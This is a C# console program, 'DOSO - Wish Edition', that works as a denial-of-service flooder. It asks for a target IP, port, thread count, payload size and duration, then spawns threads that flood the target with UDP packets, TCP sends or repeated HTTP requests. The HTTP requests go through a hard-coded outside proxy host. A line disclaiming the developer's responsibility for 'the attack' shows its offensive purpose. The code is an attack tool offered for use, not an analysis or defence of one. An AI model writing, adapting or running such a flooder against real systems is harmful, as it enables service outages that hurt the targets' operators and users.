using System;
using System.ComponentModel;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace DOSO
{
    class Program
    {
        public static string IP = "";
        public static int TIME = 0;
        public static int PORT = 0;
        public static int SIZE = 0;
        public static string PROTOCOL;
        public static int THREADS;
        public static string[] DELAY = {"1","1"};
        public static UdpClient udp;
        public static TcpClient tcp;
        static void Main(string[] args)
        {
        A:
            Console.Title = "DOSO - Wish Edition";
            try
            {
                Console.Write(@"
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹****⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹, ******⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹**********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹*****************⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹/********************⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹#*#⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹****************⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹((((⏹⏹⏹⏹⏹⏹⏹((((⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹**********⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹(*****⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹**********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹********⏹⏹⏹⏹⏹******************⏹⏹⏹⏹************************⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹******⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹*******⏹⏹⏹⏹********************⏹⏹⏹⏹*************************⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹********⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*⏹⏹⏹⏹⏹***********⏹⏹⏹⏹⏹⏹**********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹********⏹⏹⏹*************⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹********⏹⏹⏹⏹⏹******************⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹*********%⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹***************⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹************#*****************************⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹****************************************⏹⏹⏹⏹********⏹⏹⏹,******⏹⏹⏹⏹⏹⏹⏹********⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********%⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹***********************************⏹⏹⏹⏹⏹⏹⏹********⏹⏹**********************⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹***********⏹⏹⏹⏹⏹⏹************⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*******⏹⏹⏹⏹⏹⏹****************⏹⏹⏹⏹⏹⏹*******,⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*******⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*********⏹⏹⏹⏹⏹⏹⏹⏹**********⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*****⏹⏹⏹⏹⏹⏹⏹⏹**************⏹⏹⏹⏹⏹⏹⏹⏹******⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹*****⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹⏹
");
                Console.WriteLine("IP");
                IP = Console.ReadLine();
                Console.WriteLine("PORT");
                PORT = Convert.ToInt32(Console.ReadLine());
                Console.WriteLine("Threads");
                THREADS = Convert.ToInt32(Console.ReadLine());
                Console.WriteLine("SIZE");
                SIZE = Convert.ToInt32(Console.ReadLine());
                Console.WriteLine("DELAY [MIN MAX]");
                string[] sep = {" "};
                string inp = Console.ReadLine();
                if (inp.Length > 0)
                {
                    DELAY =  inp.Split(sep, StringSplitOptions.None);
                    Console.WriteLine($"Delay set MIN: {DELAY[0]}  MAX: {DELAY[1]}");
                }
                else
                {
                    goto CA;
                }
                CA:
                Console.WriteLine("TIME");
                TIME = Convert.ToInt32(Console.ReadLine());
                Console.WriteLine("PROTOCOL [UDP/TCP/HTTP]");
                string in1 = Console.ReadLine();
                switch(in1.ToUpper())
                {
                    case "UDP":
                        PROTOCOL = "UDP";
                        break;
                    case "TCP":
                        PROTOCOL = "TCP";
                        break;
                    case "HTTP":
                        PROTOCOL = "HTTP";
                        break;
                    default:
                        Console.WriteLine("False input");
                        goto A;
                }
                Console.WriteLine("Press Enter to Start");
                Console.WriteLine("Me as the dev is not responsible for the attack. \r\nDo you agree for YES press ENTER for NO press CTRL + C to leave the program (or just close it)");
                Console.ReadLine();
                
                StartAttack();
                
            }
            catch(Exception e)
            {
                Console.WriteLine(e.StackTrace);
            }
            
            
            
        }

        async public static void ReSize()
        {
            Console.Beep();
            Console.WriteLine("Building payload");
            Console.Title = "Building Payload...";
            if(SIZE > send.charss.Length)
            {
                for (int i = 0; i < SIZE - send.charss.Length; i++)
                {
                    send.charss += send.charss;
                }
            }
            send.CHAR = new char[SIZE];
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < send.CHAR.Length; i++)
            {
                Console.SetCursorPosition(0, Console.CursorTop);
                send.CHAR[i] = send.charss[new Random().Next(send.charss.Length)];
                sb.Append(send.CHAR);
                Console.WriteLine(send.CHAR[i]);
            }
            Console.Clear();
            Console.WriteLine("Payload Build Finished");
            send.charss = sb.ToString();
            Console.WriteLine("Payload: " + send.charss);
        }

        public static void StartAttack()
        {
            Console.Title = $"Attack Started: {IP}:{PORT}";
            Thread thread;
            ReSize();


           

            for (int i = 0; i < TIME; i++)
            {
                for (int ii = 0; ii < THREADS; ii++)
                {
                    thread = new Thread(new ThreadStart(START));
                    Console.WriteLine($"DOSO STARTED {ii} times");
                    Console.SetCursorPosition(0, Console.CursorTop);
                    thread.Start();
                }
            }
            
            
        }
        
        public static void START()
        {
            switch(PROTOCOL)
            {
                case "UDP":
                    StartUDP();
                    break;
                case "TCP":
                    StartTCP();
                    break;
                case "HTTP":
                    StartHTTP();
                    break;
                default:
                    Console.WriteLine("This Protocol is not suported");
                    break;
            }
            
        }

        private static void StartHTTP()
        {
          
            try
            {
                Console.WriteLine("Http seted up");
                //Console.WriteLine("Http Poxy ???.  Leave blank for no proxy");
                //string[] sepi = { ":" };
                //string[] proxy = Console.ReadLine().Split(sepi,StringSplitOptions.RemoveEmptyEntries);
                WebProxy webProxy = new WebProxy("api.flawcra.cc",8889);

                WebClient wc = new WebClient();
                HttpClient.DefaultProxy = webProxy;
                wc.Proxy = webProxy;
                HttpClient httpClient = new HttpClient();
                //httpClient.GetAsync(IP);
                HttpResponseMessage httpResponseMessage = new HttpResponseMessage();
                while(true)
                {
                    string s = wc.DownloadString(IP);
                    Console.WriteLine(s);
                }
              
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void StartUDP()
        {
        AT:
            try
            {
                udp = new UdpClient();

                IPAddress address = IPAddress.Parse(IP);
                IPEndPoint iPEnd = new IPEndPoint(address, PORT);
                udp.Client.Connect(iPEnd);
                while (udp.Client.Connected)
                {
                    Thread.Sleep(new Random().Next(Convert.ToInt32(DELAY[0]), Convert.ToInt32(DELAY[1])));
                    //udp.Client.Send();
                    udp.Client.SendTo(Encoding.UTF8.GetBytes(send.charss), Encoding.UTF8.GetBytes(send.charss).Length, SocketFlags.None, iPEnd);
                }

                

            }
            catch (Exception e)
            {
                Console.WriteLine($"E: {e.Message}");
                Console.SetCursorPosition(0, Console.CursorTop - 1);
                Console.Beep();
            }
        }

        public static void StartTCP()
        {
            AT:
            try
            {
                tcp = new TcpClient();

                IPAddress address = IPAddress.Parse(IP);
                IPEndPoint iPEnd = new IPEndPoint(address, PORT);
                tcp.Client.Connect(iPEnd);


                if (!tcp.Client.Connected)
                {
                    tcp.Client.Connect(iPEnd);
                }
                while (tcp.Client.Connected)
                {
                    Thread.Sleep(new Random().Next(Convert.ToInt32(DELAY[0]), Convert.ToInt32(DELAY[1])));
                    tcp.Client.Send(Encoding.UTF8.GetBytes(send.charss));
                    tcp.Client.Send(Encoding.UTF8.GetBytes(send.charss));
                }

            }
            catch(Exception e)
            {
                
            }
            
        }



    }
}
